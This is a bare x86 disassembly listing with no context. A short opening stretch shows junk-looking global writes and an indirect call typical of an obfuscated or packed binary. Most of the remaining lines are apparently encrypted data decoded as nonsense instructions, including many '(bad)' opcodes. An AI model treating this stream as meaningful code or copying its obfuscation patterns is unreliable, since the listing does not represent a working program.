  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   ebx,DWORD PTR [eax+0x7a5806a0],0xa7a7a7a
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x32],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x542f8bf
  40298a:	(bad)  
  40298b:	fdivrp st(6),st
  40298d:	out    0xb6,al
  40298f:	mov    dl,0xde
  402991:	mov    al,ds:0x6251d218
  402996:	outs   dx,BYTE PTR ds:[esi]
  402997:	les    edi,FWORD PTR [eax+0x63]
  40299a:	mov    ah,0xce
  40299c:	inc    ebp
  40299d:	jecxz  0x402a1e
  40299f:	(bad)  [esi+0x23]
  4029a2:	push   ss
  4029a3:	out    0x59,al
  4029a5:	pushf  
  4029a6:	fst    DWORD PTR [ecx]
  4029a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029a9:	jmp    0x4029ba
  4029ab:	jae    0x402945
  4029ad:	xchg   esp,eax
  4029ae:	xchg   DWORD PTR [ecx-0xbc8464a],edx
  4029b4:	out    dx,al
  4029b5:	mov    ebx,0x2d9b4783
  4029ba:	stc    
  4029bb:	pop    ecx
  4029bc:	inc    eax
  4029bd:	sar    DWORD PTR [eax],cl
  4029bf:	or     BYTE PTR [edi-0x40],ch
  4029c2:	addr16 xchg ebp,eax
  4029c4:	in     eax,0x62
  4029c6:	leave  
  4029c7:	fcmovbe st,st(7)
  4029c9:	sub    al,0xb
  4029cb:	test   BYTE PTR [ebx+edi*4-0x5429a721],ch
  4029d2:	inc    ebp
  4029d3:	sbb    eax,0x8825259b
  4029d8:	fsubr  DWORD PTR [edx+ecx*1]
  4029db:	xchg   DWORD PTR [ebp-0x31],ebx
  4029de:	sbb    cl,BYTE PTR [eax-0x32]
  4029e1:	sbb    BYTE PTR [esi-0x7e181229],ch
  4029e7:	fldenv ds:0x8200a41d
  4029ed:	push   edx
  4029ee:	pmullw mm3,QWORD PTR [esi]
  4029f1:	push   ds
  4029f2:	jge    0x402a2a
  4029f4:	out    dx,al
  4029f5:	sub    BYTE PTR [ebx+ecx*2-0x5d],bl
  4029f9:	xor    DWORD PTR [esi],esp
  4029fb:	mov    cl,0xb4
  4029fd:	inc    edi
  4029fe:	xchg   BYTE PTR [eax+0x6cd87254],dl
  402a04:	xchg   esi,eax
  402a05:	adc    BYTE PTR [eax+0x60],ah
  402a08:	js     0x4029c8
  402a0a:	mov    ch,0xe9
  402a0c:	stos   BYTE PTR es:[edi],al
  402a0d:	jmp    0x14ac4c04
  402a12:	gs pop eax
  402a14:	and    al,0x8e
  402a16:	cli    
  402a17:	mov    edx,0x7f3200ae
  402a1c:	fsub   DWORD PTR [ecx]
  402a1e:	mov    ecx,gs
  402a20:	mov    al,ds:0xa018c7a2
  402a25:	mov    eax,cs
  402a27:	les    eax,FWORD PTR [eax]
  402a29:	dec    ebx
  402a2a:	lods   eax,DWORD PTR ds:[esi]
  402a2b:	inc    ecx
  402a2c:	mov    esi,0xa2406073
  402a31:	div    DWORD PTR [ebp+0x4b62a895]
  402a37:	push   0x7a1e621
  402a3c:	pusha  
  402a3d:	pop    ss
  402a3e:	imul   esp,DWORD PTR [bx+di+0x6a4e],0xb39a95c9
  402a47:	mov    esi,ds
  402a49:	mov    edi,0x801caa5
  402a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a4f:	js     0x4029d1
  402a51:	pushf  
  402a52:	out    0xcf,al
  402a54:	push   es
  402a55:	(bad)  
  402a56:	sti    
  402a57:	mov    esi,0x439a4cc9
  402a5c:	fisttp WORD PTR [ebx+0x4dacc27b]
  402a62:	push   edx
  402a63:	cwde   
  402a64:	sub    BYTE PTR [ebp+ebx*4-0x21352223],bh
  402a6b:	inc    esi
  402a6c:	jo     0x402a33
  402a6e:	shr    BYTE PTR [esi],1
  402a70:	out    dx,al
  402a71:	popf   
  402a72:	jge    0x402a30
  402a74:	iret   
  402a75:	nop
  402a76:	popf   
  402a77:	out    0xfb,al
  402a79:	ret    0x35c8
  402a7c:	(bad)  
  402a7d:	jmp    0x402a28
  402a7f:	sbb    eax,eax
  402a81:	stos   BYTE PTR es:[edi],al
  402a82:	fidivr DWORD PTR [esi-0x574678ad]
  402a88:	imul   edi,esp,0x638a9d67
  402a8e:	aaa    
  402a8f:	clc    
  402a90:	(bad)  
  402a91:	cmc    
  402a92:	lea    ecx,[ebp+0x7d]
  402a95:	cmp    eax,0xfb435533
  402a9a:	or     eax,0x9956b62b
  402a9f:	jl     0x402a59
  402aa1:	mov    bh,0x70
  402aa3:	jmp    0x402ad0
  402aa5:	fdivr  QWORD PTR ds:0xa7081a48
  402aab:	int    0xb1
  402aad:	push   es
  402aae:	jae    0x402ae5
  402ab0:	dec    ecx
  402ab1:	cmp    eax,0xff591fdf
  402ab6:	aas    
  402ab7:	aam    0x98
  402ab9:	push   ebx
  402aba:	cld    
  402abb:	mov    esp,0x30f1a112
  402ac0:	dec    esp
  402ac1:	add    esp,esi
  402ac3:	neg    DWORD PTR [eax-0x4a]
  402ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ac7:	ja     0x402a85
  402ac9:	fcmovbe st,st(5)
  402acb:	fcom   st(1)
  402acd:	or     al,0x48
  402acf:	(bad)  
  402ad0:	aas    
  402ad1:	rcr    BYTE PTR [esi],0x4f
  402ad4:	mov    edi,0xed6bfd68
  402ad9:	mov    ch,0xf6
  402adb:	aam    0xbb
  402add:	sbb    eax,0xf89ef2e2
  402ae2:	adc    ch,BYTE PTR [edi+0x59]
  402ae5:	adc    DWORD PTR [esi+0x1f],esi
  402ae8:	neg    DWORD PTR [ebp+0x59e0a8f3]
  402aee:	fs es es cmc 
  402af2:	add    eax,0x190f63c2
  402af7:	jp     0x402b00
  402af9:	jl     0x402ae2
  402afb:	dec    edx
  402afc:	mov    dl,0x74
  402afe:	jbe    0x402a82
  402b00:	ss daa 
  402b02:	pop    esp
  402b03:	mov    ebp,0x87949923
  402b08:	into   
  402b09:	sbb    al,dl
  402b0b:	push   0xffffffb3
  402b0d:	pop    ss
  402b0e:	cdq    
  402b0f:	dec    esi
  402b10:	int    0x2b
  402b12:	mov    edx,0x19edf9cb
  402b17:	mov    ebx,0x1f0dec2e
  402b1c:	in     eax,0x43
  402b1e:	fdivr  DWORD PTR [ebp+0x7778480f]
  402b24:	inc    esi
  402b25:	xchg   BYTE PTR [ebx-0x4aac2382],al
  402b2b:	xchg   edi,eax
  402b2c:	dec    edx
  402b2d:	inc    edx
  402b2e:	retf   0xa7ef
  402b31:	pop    ebx
  402b32:	inc    ecx
  402b33:	das    
  402b34:	or     eax,0xe3f4e0e1
  402b39:	xchg   ecx,eax
  402b3a:	(bad)  
  402b3b:	mov    edx,0xfdc89161
  402b40:	push   ss
  402b41:	pusha  
  402b42:	lods   eax,DWORD PTR ds:[esi]
  402b43:	je     0x402b10
  402b45:	push   esi
  402b46:	ficom  WORD PTR [ebx-0xd]
  402b49:	xchg   BYTE PTR [eax+ecx*8],ah
  402b4c:	inc    ecx
  402b4d:	add    eax,0x79d1130a
  402b52:	sub    DWORD PTR [edx+eax*1],edx
  402b55:	pop    esp
  402b56:	sub    al,0xaa
  402b58:	enter  0xaf55,0x55
  402b5c:	pop    ebp
  402b5d:	inc    edx
  402b5e:	pop    ecx
  402b5f:	mov    cl,0x8c
  402b61:	mov    bh,0x52
  402b63:	stos   BYTE PTR es:[edi],al
  402b64:	push   ebp
  402b65:	push   ds
  402b66:	icebp  
  402b67:	pop    ebp
  402b68:	(bad)  
  402b69:	in     eax,0xae
  402b6b:	xchg   ebp,eax
  402b6c:	sbb    al,0x76
  402b6e:	push   edx
  402b6f:	sub    ecx,DWORD PTR [edx+0x546a00e3]
  402b75:	inc    esi
  402b76:	push   ebp
  402b77:	inc    ebx
  402b78:	in     al,0x7e
  402b7a:	mov    ebx,0xcabf0f0f
  402b7f:	mov    esp,0xc8c91cbf
  402b84:	je     0x402ba6
  402b86:	scas   eax,DWORD PTR es:[edi]
  402b87:	xchg   BYTE PTR [ebp+0x50],al
  402b8a:	xlat   BYTE PTR fs:[ebx]
  402b8c:	hlt    
  402b8d:	add    esi,ebx
  402b8f:	mov    eax,ds:0x5f59a3f0
  402b94:	dec    edi
  402b95:	scas   al,BYTE PTR es:[edi]
  402b96:	mov    ch,0x60
  402b98:	sub    eax,0x59ad53b4
  402b9d:	jmp    0x262231b
  402ba2:	ds sub ebx,ebp
  402ba5:	mov    ds:0xf14da16e,al
  402baa:	out    0xef,eax
  402bac:	xor    al,0xdc
  402bae:	push   ds
  402baf:	pop    es
  402bb0:	outs   dx,DWORD PTR ds:[esi]
  402bb1:	sti    
  402bb2:	pop    eax
  402bb3:	dec    esp
  402bb4:	lds    eax,FWORD PTR [ebx-0x1132d473]
  402bba:	sti    
  402bbb:	les    eax,FWORD PTR [ecx]
  402bbd:	fiadd  DWORD PTR [esi+eax*4-0x1e9afc6d]
  402bc4:	es push 0x7b
  402bc7:	sar    bh,cl
  402bc9:	add    edi,esp
  402bcb:	sbb    esi,edx
  402bcd:	test   eax,0x29ae981c
  402bd2:	push   ecx
  402bd3:	lods   al,BYTE PTR ds:[esi]
  402bd4:	cld    
  402bd5:	push   es
  402bd6:	sub    esi,0x43
  402bd9:	jo     0x402beb
  402bdb:	push   ds
  402bdc:	int    0x6f
  402bde:	shl    dl,1
  402be0:	mov    cl,0x6b
  402be2:	inc    edi
  402be3:	inc    eax
  402be4:	(bad)  [ebx-0x38]
  402be7:	inc    cl
  402be9:	adc    eax,0x693655f2
  402bee:	xchg   esp,eax
  402bef:	push   esi
  402bf0:	sub    BYTE PTR [edx-0x3335ae58],0x50
  402bf7:	test   BYTE PTR [ebp+0xb],0x5
  402bfb:	das    
  402bfc:	out    dx,eax
  402bfd:	icebp  
  402bfe:	mov    BYTE PTR [ebx+eiz*4+0x5],0xa7
  402c03:	push   edi
  402c04:	shl    BYTE PTR [ebx+ebp*1-0x6786afe0],cl
  402c0b:	es nop
  402c0d:	into   
  402c0e:	jmp    0x8b93c0e6
  402c13:	ds mov cl,0x72
  402c16:	sbb    al,0x37
  402c18:	fisubr DWORD PTR [eax]
  402c1a:	(bad)  [edi+ebp*4+0x7d]
  402c1e:	lock enter 0x8da7,0x24
  402c23:	shr    DWORD PTR [edx+0x39],1
  402c26:	sbb    al,0xd
  402c28:	push   es
  402c29:	mov    ds:0xe46a5903,al
  402c2e:	fdiv   QWORD PTR [eax]
  402c30:	inc    ebp
  402c31:	out    dx,eax
  402c32:	stos   DWORD PTR es:[edi],eax
  402c33:	pop    ecx
  402c34:	sub    BYTE PTR [eax+0x65e17e96],ah
  402c3a:	jb     0x402be6
  402c3c:	xchg   ebx,eax
  402c3d:	neg    DWORD PTR [ebx+0x61]
  402c40:	sub    BYTE PTR [ebp+0x76],0x17
  402c44:	sahf   
  402c45:	fcomp  st(7)
  402c47:	imul   ebp,DWORD PTR [edx-0x61],0xad2693b0
  402c4e:	sti    
  402c4f:	gs inc eax
  402c51:	mov    dl,0x13
  402c53:	inc    esi
  402c54:	rcl    DWORD PTR [edi+edi*4],0xa
  402c58:	dec    ecx
  402c59:	stos   BYTE PTR es:[edi],al
  402c5a:	mov    al,0x1e
  402c5c:	pop    esi
  402c5d:	push   edi
  402c5e:	test   al,0x4b
  402c60:	xchg   ebx,eax
  402c61:	vmovdqu ymm5,YMMWORD PTR cs:[ecx+0x75b568f6]
  402c6a:	loopne 0x402c20
  402c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c6d:	sahf   
  402c6e:	imul   eax,DWORD PTR [edx],0x5e
  402c71:	xchg   BYTE PTR ds:0xb1490bd0,dl
  402c77:	arpl   WORD PTR [edx+0x560d313d],si
  402c7d:	loopne 0x402c6e
  402c7f:	jg     0x402c8b
  402c81:	sub    ecx,esi
  402c83:	retf   0x2585
  402c86:	sbb    eax,0xb508f468
  402c8b:	cmp    cl,cl
  402c8d:	pusha  
  402c8e:	pop    ebx
  402c8f:	(bad)  
  402c90:	mov    bh,0x74
  402c92:	or     DWORD PTR [esi],esp
  402c94:	mov    dh,0x10
  402c96:	out    dx,al
  402c97:	sti    
  402c98:	aaa    
  402c99:	mov    bh,0x0
  402c9b:	dec    esp
  402c9c:	jg     0x402ce7
  402c9e:	mov    ebx,esp
  402ca0:	jne    0x402c84
  402ca2:	into   
  402ca3:	add    edx,0xffffffd7
  402ca6:	jl     0x402c85
  402ca8:	dec    edx
  402ca9:	xchg   edx,eax
  402caa:	sti    
  402cab:	sbb    eax,0x71aea604
  402cb0:	daa    
  402cb1:	test   BYTE PTR [edx-0x43e12427],cl
  402cb7:	sar    DWORD PTR [esi],cl
  402cb9:	xchg   esp,eax
  402cba:	jb     0x402ccd
  402cbc:	gs sbb DWORD PTR cs:[eax-0x36],esp
  402cc1:	xchg   ecx,eax
  402cc2:	(bad)  
  402cc3:	dec    edx
  402cc4:	add    esi,DWORD PTR [edx]
  402cc6:	inc    edx
  402cc7:	outs   dx,DWORD PTR ds:[esi]
  402cc8:	xchg   DWORD PTR [edx],ebp
  402cca:	jmp    0x402c56
  402ccc:	xchg   ebx,eax
  402ccd:	sbb    cl,BYTE PTR [eax+0x2f]
  402cd0:	xchg   ebx,eax
  402cd1:	mov    edi,0x55569457
  402cd6:	add    edi,DWORD PTR [ecx+0x35d3d1db]
  402cdc:	setne  BYTE PTR [eax]
  402cdf:	stos   DWORD PTR es:[edi],eax
  402ce0:	iret   
  402ce1:	xchg   esi,eax
  402ce2:	test   al,0x56
  402ce4:	rol    DWORD PTR [edx+eiz*1+0x72],0x8
  402ce9:	scas   eax,DWORD PTR es:[edi]
  402cea:	fist   DWORD PTR [ebp-0x25beb96f]
  402cf0:	jp     0x402d53
  402cf2:	enter  0xf8a4,0xf
  402cf6:	cli    
  402cf7:	jmp    0xccf1ba08
  402cfc:	adc    ebp,DWORD PTR [edi-0x36cff5d9]
  402d02:	mov    DWORD PTR [esi+0x4b5b8097],eax
  402d08:	cmc    
  402d09:	cmp    al,0x9d
  402d0b:	pop    ds
  402d0c:	shl    DWORD PTR [ecx+0xb],1
  402d0f:	aad    0x44
  402d11:	inc    edi
  402d12:	mov    al,0x60
  402d14:	loop   0x402d33
  402d16:	std    
  402d17:	sub    bh,BYTE PTR [ecx+0x4d]
  402d1a:	cld    
  402d1b:	add    bl,dl
  402d1d:	mov    esi,DWORD PTR [ecx]
  402d1f:	add    dh,al
  402d21:	xchg   DWORD PTR [edx-0x3e],esp
  402d24:	cli    
  402d25:	ins    DWORD PTR es:[edi],dx
  402d26:	cwde   
  402d27:	lea    esp,[edi+eiz*8+0x7]
  402d2b:	rcl    DWORD PTR [ebx+0xed3568e],cl
  402d31:	ja     0x402d08
  402d33:	lea    edx,[ebp-0x1f]
  402d36:	js     0x402d46
  402d38:	mov    al,ds:0x1e666893
  402d3d:	jle    0x402d04
  402d3f:	mov    eax,ds:0x4da0a4a1
  402d44:	xor    al,0xd3
  402d46:	pop    ebp
  402d47:	pop    ds
  402d48:	inc    ebp
  402d49:	push   0xffffffe0
  402d4b:	pop    esi
  402d4c:	into   
  402d4d:	add    eax,0xfd91b849
  402d52:	xchg   esi,eax
  402d53:	sahf   
  402d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d55:	mov    ebx,0xbcc9fde5
  402d5a:	pusha  
  402d5b:	dec    ebp
  402d5c:	sbb    eax,0x6ed0005a
  402d61:	dec    esp
  402d62:	call   0x494721ed
  402d67:	jmp    0xf896:0x5c9d0d55
  402d6e:	pop    ecx
  402d6f:	mov    dl,0xe
  402d71:	popa   
  402d72:	out    dx,eax
  402d73:	(bad)  
  402d74:	into   
  402d75:	or     DWORD PTR [edi],eax
  402d77:	fs test eax,0xaf8a59d3
  402d7d:	repz dec esp
  402d7f:	arpl   WORD PTR [esi-0x4b],bx
  402d82:	inc    eax
  402d83:	(bad)  
  402d84:	xor    dh,BYTE PTR [edx]
  402d86:	loope  0x402d8d
  402d88:	je     0x402dad
  402d8a:	mov    cl,0x15
  402d8c:	push   0x5f
  402d8e:	and    al,0xe5
  402d90:	test   DWORD PTR [ecx],ebx
  402d92:	(bad)
  402d96:	jmp    0x2dd:0x27493e41
  402d9d:	xchg   ecx,eax
  402d9e:	loope  0x402d62
  402da0:	(bad)  
  402da2:	test   DWORD PTR [ebx+0x1b9d5c5e],ecx
  402da8:	mov    ch,0x5a
  402daa:	leave  
  402dab:	lds    eax,FWORD PTR [esi+ecx*2-0x11]
  402daf:	push   edx
  402db0:	(bad)  
  402db1:	jmp    ebx
  402db3:	fstp   QWORD PTR [edi-0x21ef5211]
  402db9:	pop    eax
  402dba:	jnp    0x402d98
  402dbc:	push   ebp
  402dbd:	inc    eax
  402dbe:	sbb    edx,DWORD PTR [ebp+ecx*4-0x14]
  402dc2:	mov    bh,0x73
  402dc4:	add    DWORD PTR [ebx+0x76],esp
  402dc7:	in     al,0xc6
  402dc9:	sub    BYTE PTR [esi+0x7c],0xc4
  402dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dce:	push   es
  402dcf:	into   
  402dd0:	pop    es
  402dd1:	in     eax,0x51
  402dd3:	inc    ebx
  402dd4:	sbb    al,0x6d
  402dd6:	pop    eax
  402dd7:	dec    edi
  402dd8:	mov    dx,0x6fca
  402ddc:	int    0xa6
  402dde:	int    0xc1
  402de0:	mov    eax,0x8dce9a96
  402de5:	repz cli 
  402de7:	push   ds
  402de8:	cld    
  402de9:	sbb    DWORD PTR [edx-0x5621a25a],ebx
  402def:	jmp    0x5c27a122
  402df4:	inc    edi
  402df5:	neg    BYTE PTR [edi+edx*2]
  402df8:	mov    edx,0x11a849c0
  402dfd:	xchg   esp,eax
  402dfe:	out    0xf8,eax
  402e00:	mov    ah,BYTE PTR [edx+0x4d]
  402e03:	leave  
  402e04:	or     eax,0x67143dd2
  402e09:	jge    0x402e78
  402e0b:	in     al,0x5e
  402e0d:	js     0x402db7
  402e0f:	pop    edx
  402e10:	xor    edi,DWORD PTR [ebp-0x64]
  402e13:	lods   al,BYTE PTR ds:[esi]
  402e14:	pop    esi
  402e15:	rcr    BYTE PTR [edx+0x1a],0xc9
  402e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e1a:	repz jne 0x402e3d
  402e1d:	add    al,0xc9
  402e1f:	iret   
  402e20:	jb     0x402dba
  402e22:	dec    DWORD PTR [ecx+0x7f]
  402e25:	fst    QWORD PTR [ecx]
  402e27:	shl    DWORD PTR ds:0xc3a1ce76,cl
  402e2d:	add    eax,0x645717be
  402e32:	xor    eax,0x34e677ee
  402e37:	dec    edx
  402e38:	mov    ebp,0xc6528818
  402e3d:	(bad)  
  402e3e:	xchg   edx,eax
  402e3f:	jns    0x402e63
  402e41:	jns    0x402e31
  402e43:	icebp  
  402e44:	adc    ah,BYTE PTR [edi]
  402e46:	inc    ecx
  402e47:	mov    esp,0x3c3c20d6
  402e4c:	popa   
  402e4d:	pusha  
  402e4e:	ret    
  402e4f:	in     al,dx
  402e50:	call   0xbd182d5a
  402e55:	dec    edx
  402e56:	iret   
  402e57:	xchg   ebp,eax
  402e58:	pop    esi
  402e59:	and    ecx,DWORD PTR [ecx+esi*2]
  402e5c:	adc    al,0x5b
  402e5e:	fisubr DWORD PTR [ebx-0x25]
  402e61:	sbb    BYTE PTR [ebx-0x5d3418d3],cl
  402e67:	dec    ecx
  402e68:	add    bx,cx
  402e6b:	dec    edx
  402e6c:	jge    0x402ea4
  402e6e:	gs data16 mov bh,0xfd
  402e72:	outs   dx,DWORD PTR ds:[esi]
  402e73:	jl     0x402e93
  402e75:	jmp    0x402ef6
  402e77:	or     ch,ch
  402e79:	or     DWORD PTR [ebx-0x70],esp
  402e7c:	lahf   
  402e7d:	pop    edi
  402e7e:	cmp    eax,0xd9b5a9c6
  402e83:	sub    esi,ecx
  402e85:	je     0x402e13
  402e87:	and    DWORD PTR [edi-0x61],eax
  402e8a:	rol    ebp,cl
  402e8c:	mov    dh,0x9
  402e8e:	mov    eax,ds:0x5d38489e
  402e93:	inc    esi
  402e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e95:	mov    edi,0x8df2da03
  402e9a:	sahf   
  402e9b:	ret    0x14c2
  402e9e:	ret    
  402e9f:	in     eax,dx
  402ea0:	test   eax,0x7bf252d9
  402ea5:	in     eax,0xed
  402ea7:	add    DWORD PTR [ecx-0x62965a20],ebp
  402ead:	push   ecx
  402eae:	shl    DWORD PTR [edx],cl
  402eb0:	mov    esp,0xd01fef69
  402eb5:	lock xor al,0xae
  402eb8:	adc    ebx,DWORD PTR [esi-0x7c]
  402ebb:	aas    
  402ebc:	jl     0x402e89
  402ebe:	jp     0x402ea0
  402ec0:	lds    ebx,FWORD PTR [ebp+0x11]
  402ec3:	rol    DWORD PTR [esi*8-0x7981a5ed],1
  402eca:	push   edx
  402ecb:	fs imul edi,ebx,0x32b0aa9
  402ed2:	cmp    esi,DWORD PTR [esi]
  402ed4:	push   ecx
  402ed5:	and    DWORD PTR ds:0x95a934a6,edi
  402edb:	jnp    0x402eb1
  402edd:	push   ebp
  402ede:	rol    dl,cl
  402ee0:	add    dl,bh
  402ee2:	test   DWORD PTR [esi+0x69],0x860ef388
  402ee9:	jmp    0x90b6:0xb4671a6b
  402ef0:	iret   
  402ef1:	add    ecx,DWORD PTR [ebx+edx*4-0x1c]
  402ef5:	mov    DWORD PTR [ebx-0x79ba4ea],esp
  402efb:	fnstcw WORD PTR [edx-0x75fcb70e]
  402f01:	icebp  
  402f02:	add    BYTE PTR [edi+0x654a0cc8],ch
  402f08:	sysret 
  402f0a:	inc    eax
  402f0b:	lods   eax,DWORD PTR ds:[esi]
  402f0c:	xchg   ebx,eax
  402f0d:	nop
  402f0e:	mul    bl
  402f10:	push   cs
  402f11:	cmp    edi,DWORD PTR [edi+0x72]
  402f14:	cli    
  402f15:	gs mov ebx,eax
  402f18:	dec    esi
  402f19:	popf   
  402f1a:	ss xchg edx,eax
  402f1c:	call   0x6569:0x46b96aaa
  402f23:	mov    esi,0x8e6f0abb
  402f28:	test   al,ah
  402f2a:	mov    esi,0x39fb41df
  402f2f:	dec    esi
  402f30:	jae    0x402f00
  402f32:	sub    eax,0x33ec1f46
  402f37:	stos   BYTE PTR es:[edi],al
  402f38:	pop    edx
  402f39:	daa    
  402f3a:	pop    edi
  402f3b:	sbb    eax,0xd6c1c221
  402f40:	dec    BYTE PTR [ecx+0x1b7bb0ba]
  402f46:	or     al,0x6e
  402f48:	loopne 0x402ece
  402f4a:	fidiv  WORD PTR [esi+0x10]
  402f4d:	push   cs
  402f4e:	mov    cl,0xfd
  402f50:	add    BYTE PTR [ecx],al
  402f52:	invd   
  402f54:	sub    al,0x4
  402f56:	sbb    ecx,edi
  402f58:	push   0x901b616c
  402f5d:	sub    BYTE PTR [eax],dl
  402f5f:	sub    BYTE PTR [ecx+0x16c34ede],0xff
  402f66:	cld    
  402f67:	jge    0x402f44
  402f69:	icebp  
  402f6a:	inc    edx
  402f6b:	lahf   
  402f6c:	sub    edi,eax
  402f6e:	cmp    BYTE PTR ds:0xca0d360d,dh
  402f74:	in     al,0xbb
  402f76:	dec    edi
  402f77:	cmp    esi,DWORD PTR [ebp+0xd87a259]
  402f7d:	fidivr WORD PTR [edx]
  402f7f:	mov    WORD PTR [edi+0x76d9a3e5],?
  402f85:	outs   dx,DWORD PTR ds:[esi]
  402f86:	jmp    0xf02b7bdb
  402f8b:	push   edi
  402f8c:	pop    esp
  402f8d:	pop    edi
  402f8e:	shl    ebp,1
  402f90:	pop    esp
  402f91:	add    al,0x4e
  402f93:	pop    ebx
  402f94:	stc    
  402f95:	dec    ecx
  402f96:	cmp    eax,0xe6390919
  402f9b:	dec    ebp
  402f9c:	mov    ds:0xcc5d4b79,eax
  402fa1:	jo     0x403022
  402fa3:	push   ecx
  402fa4:	pop    ds
  402fa5:	cmc    
  402fa6:	into   
  402fa7:	mov    al,ds:0xb143a58f
  402fac:	cmp    eax,0x5e885b88
  402fb1:	or     DWORD PTR [ecx],edi
  402fb3:	sahf   
  402fb4:	sub    al,0x76
  402fb6:	retf   0x2141
  402fb9:	mov    eax,ds:0x25b81af0
  402fbe:	bound  esp,QWORD PTR [ebx]
  402fc0:	sbb    al,0xb9
  402fc2:	not    BYTE PTR [ecx]
  402fc4:	xchg   ebp,eax
  402fc5:	(bad)  
  402fc6:	into   
  402fc7:	jno    0x402f6e
  402fc9:	retf   0xc99
  402fcc:	xor    DWORD PTR [ecx],ecx
  402fce:	stc    
  402fcf:	outs   dx,BYTE PTR ds:[esi]
  402fd0:	loop   0x403050
  402fd2:	mov    dl,0x62
  402fd4:	jg     0x402fb0
  402fd6:	int    0xc0
  402fd8:	xor    BYTE PTR [ecx+eiz*8-0x67],0x72
  402fdd:	retf   
  402fde:	xor    DWORD PTR gs:[ecx],0xffffff94
  402fe2:	int3   
  402fe3:	sbb    dh,BYTE PTR [edx]
  402fe5:	call   0x60d8:0x8584fd1
  402fec:	inc    edi
